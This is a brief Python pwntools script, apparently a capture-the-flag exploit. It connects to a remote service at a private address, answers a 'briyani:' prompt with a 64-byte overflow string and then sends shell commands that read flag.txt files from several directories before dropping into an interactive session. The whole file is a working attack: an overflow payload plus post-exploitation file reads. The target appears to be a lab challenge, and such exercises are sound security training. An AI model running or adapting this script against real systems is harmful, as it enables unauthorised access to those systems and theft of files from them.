from pwn import *
context.log_level = 'info'

p = remote('10.128.145.169', 9001)

p.recvuntil(b'briyani:')
p.sendline(b'A' * 64)
p.sendline(b'cat /flag.txt 2>/dev/null; cat /home/*/flag.txt 2>/dev/null; cat flag.txt 2>/dev/null')
p.interactive()
